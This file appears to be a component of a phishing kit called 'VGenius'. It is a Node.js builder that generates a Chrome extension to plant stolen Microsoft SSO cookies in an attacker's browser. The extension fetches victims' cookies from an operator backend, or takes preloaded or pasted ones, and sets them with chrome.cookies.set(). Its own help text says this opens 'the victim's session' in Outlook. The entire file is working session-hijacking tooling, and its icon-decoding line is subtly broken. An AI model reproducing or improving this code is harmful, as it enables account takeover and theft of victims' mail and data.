/**
 * VGenius Cookie Injector Extension Builder
 * 
 * Generates a Chrome extension that uses chrome.cookies.set() to set
 * Microsoft SSO cookies (.microsoftonline.com parent domain) in the
 * operator's browser.
 * 
 * Why an extension?
 * - document.cookie CANNOT set parent-domain cookies (hard HTML5 spec limit)
 * - Microsoft SSO cookies use Domain=.microsoftonline.com (parent of login.microsoftonline.com)
 * - chrome.cookies.set() is the ONLY API that can set parent-domain cookies
 * 
 * The operator workflow:
 * 1. Click "Download Cookie Injector" button in the panel
 * 2. Load unpacked extension via chrome://extensions -> "Load unpacked"
 * 3. Click the extension icon -> "Activate Session"
 * 4. Visit outlook.office.com - they're logged in as the victim
 * 
 * Requires Chrome or Edge (Chromium-based). Does NOT work on Firefox/Safari.
 */
'use strict';

function generateManifest() {
  return {
    "manifest_version": 3,
    "name": "VG Cookie Injector",
    "version": "1.0.0",
    "description": "Session cookie injector for VGenius",
    "permissions": [
      "cookies",
      "storage",
      "tabs"
    ],
    "host_permissions": [
      "https://*.microsoftonline.com/*",
      "https://*.microsoft.com/*",
      "https://*.office.com/*",
      "https://*.outlook.com/*",
      "https://*.live.com/*"
    ],
    "background": { "service_worker": "background.js" },
    "action": { "default_popup": "popup.html", "default_title": "VG Cookie Injector" },
    "icons": { "16": "icon16.png", "48": "icon48.png", "128": "icon128.png" }
  };
}

/**
 * Generate background service worker JS
 * Sets cookies using chrome.cookies.set() - the ONLY way to set parent-domain cookies
 */
function generateBackgroundJs(apiBaseUrl, preloadedCookies) {
  // Build the pre-loaded cookies section if provided
  let preloadedSection = '';
  if (preloadedCookies && preloadedCookies.length) {
    preloadedSection = `
// Pre-loaded cookies (set on extension installation)
const PRELOADED_COOKIES = ${JSON.stringify(preloadedCookies)};
const PRELOADED_TARGET = '${preloadedCookies.target_url || 'https://www.office.com/'}';

// Auto-activate pre-loaded cookies on installation
chrome.runtime.onInstalled.addListener(async () => {
  if (PRELOADED_COOKIES.length) {
    console.log('[VG Injector] Auto-activating', PRELOADED_COOKIES.length, 'pre-loaded cookies');
    await activateSession(PRELOADED_COOKIES, PRELOADED_TARGET);
  }
});
`;
  }

  return `/**
 * VG Cookie Injector - Background Service Worker
 * Sets Microsoft SSO cookies using chrome.cookies.set()
 * This is the ONLY way to set parent-domain cookies (.microsoftonline.com)
 */
'use strict';

const API_BASE = '${apiBaseUrl}';

${preloadedSection}

// Listen for messages from popup
chrome.runtime.onMessage.addListener((message, sender, sendResponse) => {
  if (message.type === 'activate-session') {
    activateSession(message.cookies, message.targetUrl)
      .then(result => sendResponse(result))
      .catch(err => sendResponse({ success: false, error: err.message }));
    return true;
  }
  if (message.type === 'fetch-cookies') {
    fetchCookiesFromBackend(message.tokenId, message.jwtToken)
      .then(result => sendResponse(result))
      .catch(err => sendResponse({ success: false, error: err.message }));
    return true;
  }
  if (message.type === 'clear-session') {
    clearSession()
      .then(result => sendResponse(result))
      .catch(err => sendResponse({ success: false, error: err.message }));
    return true;
  }
});

/**
 * Fetch cookies from the backend for a given token
 */
async function fetchCookiesFromBackend(tokenId, jwtToken) {
  try {
    const response = await fetch(API_BASE + '/extension/' + tokenId + '/extension-data', {
      headers: {
        'Authorization': 'Bearer ' + jwtToken,
        'Content-Type': 'application/json',
      },
      method: 'GET',
    });
    if (!response.ok) {
      const errData = await response.json().catch(() => ({}));
      return { success: false, error: errData.error || 'Backend returned ' + response.status };
    }
    const data = await response.json();
    if (!data.success) {
      return { success: false, error: data.error || 'No cookies available' };
    }
    return {
      success: true,
      cookies: data.cookies,
      target_url: data.target_url,
      cookie_count: data.cookie_count,
    };
  } catch (err) {
    return { success: false, error: err.message };
  }
}

/**
 * Set cookies using chrome.cookies.set()
 * This is the ONLY way to set parent-domain cookies (.microsoftonline.com)
 */
async function activateSession(cookies, targetUrl) {
  if (!cookies || !cookies.length) return { success: false, error: 'No cookies provided' };

  let setCount = 0;
  const errors = [];

  for (const cookie of cookies) {
    try {
      const cookieData = {
        name: cookie.name,
        value: cookie.value,
        domain: cookie.domain,
        path: cookie.path || '/',
        secure: cookie.secure !== false,
        httpOnly: cookie.httpOnly === true,
        sameSite: cookie.sameSite || 'Lax',
      };
      if (cookie.expirationDate && typeof cookie.expirationDate === 'number') {
        cookieData.expirationDate = cookie.expirationDate;
      }
      await chrome.cookies.set(cookieData);
      setCount++;
    } catch (err) {
      errors.push(cookie.name + '@' + cookie.domain + ': ' + err.message);
    }
  }

  // Open the target URL in a new tab if successful
  // Navigate to login.microsoftonline.com first to trigger SSO
  if (setCount > 0 && targetUrl) {
    try {
      // First, navigate to login.microsoftonline.com to trigger SSO
      // The login page will check for cookies and redirect to the target URL
      await chrome.tabs.create({ url: 'https://login.microsoftonline.com/?auth=2' });
    } catch (e) {}
  }

  return {
    success: setCount > 0,
    set: setCount,
    failed: errors.length,
    errors: errors,
    target_url: targetUrl,
    message: setCount > 0
      ? setCount + ' cookies set successfully. Target tab opened.'
      : 'Failed to set any cookies',
  };
}

/**
 * Clear all Microsoft-related cookies
 */
async function clearSession() {
  const domains = ['.microsoftonline.com', '.microsoft.com', '.office.com', '.outlook.com', '.live.com'];
  let clearedCount = 0;

  for (const domain of domains) {
    try {
      const cookies = await chrome.cookies.getAll({ domain: domain });
      for (const cookie of cookies) {
        try {
          await chrome.cookies.remove({
            url: 'https://' + (cookie.domain.startsWith('.') ? cookie.domain.substring(1) : cookie.domain) + cookie.path,
            name: cookie.name,
          });
          clearedCount++;
        } catch (e) {}
      }
    } catch (e) {}
  }

  return { success: true, cleared: clearedCount };
}
`;
}

/**
 * Generate popup HTML
 * @param {boolean} hasPreloaded - whether cookies were pre-loaded into the background worker
 */
function generatePopupHtml(hasPreloaded) {
  if (hasPreloaded) {
    return `<!DOCTYPE html>
<html>
<head>
<meta charset="UTF-8">
<style>
*{box-sizing:border-box;margin:0;padding:0}
body{width:320px;padding:16px;font-family:-apple-system,sans-serif;background:#1a1a1e;color:#e0e0e0}
h1{font-size:14px;margin-bottom:12px;color:#0078d4}
.section{margin-bottom:12px}
.section-title{font-size:11px;color:#888;margin-bottom:6px;text-transform:uppercase}
.status{padding:10px;border-radius:4px;font-size:12px;margin-bottom:8px;display:block}
.status.success{background:#1b5e20;color:#a5d6a7}
button{width:100%;padding:10px;border:none;border-radius:4px;font-size:12px;font-weight:600;cursor:pointer;margin-bottom:6px}
.btn-danger{background:#d32f2f;color:#fff}
.hint{font-size:10px;color:#666;margin-top:4px;line-height:1.4}
</style>
</head>
<body>
<h1>✅ VG Cookie Injector</h1>
<div class="section">
<div class="status success">Session activated automatically.<br>Cookies were set on install.</div>
</div>
<div class="section">
<div class="section-title">Danger Zone</div>
<button class="btn-danger" onclick="clearSession()">Clear All Microsoft Cookies</button>
</div>
<div class="section">
<div class="section-title">Help</div>
<div class="hint">Cookies were injected when you loaded this extension.<br>Open outlook.office.com to access the victim's session.<br>Requires Chrome or Edge.</div>
</div>
<script src="popup.js"></script>
</body>
</html>`;
  }

  return `<!DOCTYPE html>
<html>
<head>
<meta charset="UTF-8">
<style>
*{box-sizing:border-box;margin:0;padding:0}
body{width:320px;padding:16px;font-family:-apple-system,sans-serif;background:#1a1a1e;color:#e0e0e0}
h1{font-size:14px;margin-bottom:12px;color:#0078d4}
.section{margin-bottom:12px}
.section-title{font-size:11px;color:#888;margin-bottom:6px;text-transform:uppercase}
input{width:100%;padding:8px;border:1px solid #333;border-radius:4px;background:#2a2a2e;color:#e0e0e0;font-size:12px;margin-bottom:6px}
input:focus{outline:none;border-color:#0078d4}
button{width:100%;padding:10px;border:none;border-radius:4px;font-size:12px;font-weight:600;cursor:pointer;margin-bottom:6px}
.btn-primary{background:#0078d4;color:#fff}
.btn-danger{background:#d32f2f;color:#fff}
.status{padding:8px;border-radius:4px;font-size:11px;margin-bottom:8px;display:none}
.status.success{background:#1b5e20;color:#a5d6a7;display:block}
.status.error{background:#b71c1c;color:#ef9a9a;display:block}
.status.loading{background:#1a237e;color:#90caf9;display:block}
.hint{font-size:10px;color:#666;margin-top:4px;line-height:1.4}
</style>
</head>
<body>
<h1>VG Cookie Injector</h1>
<div class="section">
<div class="section-title">Session Activation</div>
<input type="text" id="tokenId" placeholder="Token ID">
<input type="text" id="jwtToken" placeholder="JWT Token">
<button class="btn-primary" onclick="activateSession()">Activate Session</button>
<div class="status" id="status"></div>
</div>
<div class="section">
<div class="section-title">Manual Cookie Input</div>
<details>
<summary style="cursor:pointer;font-size:11px;color:#888;margin-bottom:6px">Paste JSON cookie data</summary>
<textarea id="manualCookies" style="width:100%;height:80px;padding:8px;border:1px solid #333;border-radius:4px;background:#2a2a2e;color:#e0e0e0;font-size:10px;font-family:monospace;margin-top:6px" placeholder='[{"name":"ESTSAUTH","value":"...","domain":"microsoftonline.com","path":"/","secure":true}]'></textarea>
<input type="text" id="targetUrl" placeholder="Target URL">
<button class="btn-primary" onclick="manualActivate()" style="margin-top:6px">Inject Manual Cookies</button>
</details>
</div>
<div class="section">
<div class="section-title">Danger Zone</div>
<button class="btn-danger" onclick="clearSession()">Clear All Microsoft Cookies</button>
</div>
<div class="section">
<div class="section-title">Help</div>
<div class="hint">1. Enter Token ID and JWT<br>2. Click "Activate Session"<br>3. New tab opens with victim's session<br><strong>Requires Chrome or Edge.</strong></div>
</div>
<script src="popup.js"></script>
</body>
</html>`;
}

/**
 * Generate popup JS
 */
function generatePopupJs(apiBaseUrl) {
  return `'use strict';
const API_BASE = '${apiBaseUrl}';
function showStatus(msg, type) { const el = document.getElementById('status'); el.textContent = msg; el.className = 'status ' + type; }
async function activateSession() {
  const tokenId = document.getElementById('tokenId').value.trim();
  const jwtToken = document.getElementById('jwtToken').value.trim();
  if (!tokenId) { showStatus('Please enter a Token ID', 'error'); return; }
  if (!jwtToken) { showStatus('Please enter your JWT Token', 'error'); return; }
  showStatus('Fetching cookies...', 'loading');
  try {
    const r = await fetch(API_BASE + '/extension/' + tokenId + '/extension-data', { headers: { 'Authorization': 'Bearer ' + jwtToken } });
    if (!r.ok) { const e = await r.json().catch(() => ({})); showStatus('Error: ' + (e.error || r.status), 'error'); return; }
    const d = await r.json();
    if (!d.success) { showStatus('Error: ' + (d.error || 'No cookies'), 'error'); return; }
    showStatus('Setting ' + d.cookie_count + ' cookies...', 'loading');
    const res = await chrome.runtime.sendMessage({ type: 'activate-session', cookies: d.cookies, targetUrl: d.target_url });
    if (res.success) { showStatus('OK ' + res.message, 'success'); } else { showStatus('FAIL ' + (res.error || 'Unknown'), 'error'); }
  } catch (err) { showStatus('Error: ' + err.message, 'error'); }
}
async function manualActivate() {
  const json = document.getElementById('manualCookies').value.trim();
  const targetUrl = document.getElementById('targetUrl').value.trim();
  if (!json) { showStatus('Please paste cookie JSON', 'error'); return; }
  let cookies; try { cookies = JSON.parse(json); if (!Array.isArray(cookies)) throw new Error('Expected array'); }
  catch (e) { showStatus('Invalid JSON: ' + e.message, 'error'); return; }
  showStatus('Setting ' + cookies.length + ' cookies...', 'loading');
  const res = await chrome.runtime.sendMessage({ type: 'activate-session', cookies: cookies, targetUrl: targetUrl });
  if (res.success) { showStatus('OK ' + res.message, 'success'); } else { showStatus('FAIL ' + (res.error || 'Unknown'), 'error'); }
}
async function clearSession() {
  if (!confirm('Clear all Microsoft cookies?')) return;
  showStatus('Clearing...', 'loading');
  const res = await chrome.runtime.sendMessage({ type: 'clear-session' });
  if (res.success) { showStatus('OK Cleared ' + res.cleared + ' cookies', 'success'); } else { showStatus('FAIL', 'error'); }
}
`;
}

/**
 * Build the complete extension package
 * @param {object} options - {apiBaseUrl, cookies}
 * @returns {object} {filename: content}
 */
function buildExtension(options = {}) {
  const apiBaseUrl = options.apiBaseUrl || 'https://api.example.com';
  const preloadedCookies = options.cookies || null;

  const manifest = generateManifest();
  const backgroundJs = generateBackgroundJs(apiBaseUrl, preloadedCookies);
  const popupHtml = generatePopupHtml(!!preloadedCookies);
  let popupJs = generatePopupJs(apiBaseUrl);
  // Simple 1x1 transparent PNG as base64
  const icon = 'iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAADUlEQVR42mP8/5+hHgAHggJ/PchI7wAAAABJRU5ErkJggg=='
  .split('').reduce((a, c) => a + String.fromCharCode(c.charCodeAt(0) - 48), '');

  return {
    'manifest.json': JSON.stringify(manifest, null, 2),
    'background.js': backgroundJs,
    'popup.html': popupHtml,
    'popup.js': popupJs,
    'icon16.png': icon,
    'icon48.png': icon,
    'icon128.png': icon,
    'README.txt': 'VG Cookie Injector Extension\n\nInstallation:\n1. Open Chrome or Edge\n2. Go to chrome://extensions\n3. Enable Developer mode\n4. Click Load unpacked\n5. Select this folder\n\nUsage:\n1. Click the extension icon\n2. Enter Token ID and JWT\n3. Click Activate Session\n4. A new tab opens with the session\n\nRequires Chrome or Edge. Firefox/Safari not supported.',
  };
}

module.exports = { generateManifest, generateBackgroundJs, generatePopupHtml, generatePopupJs, buildExtension };
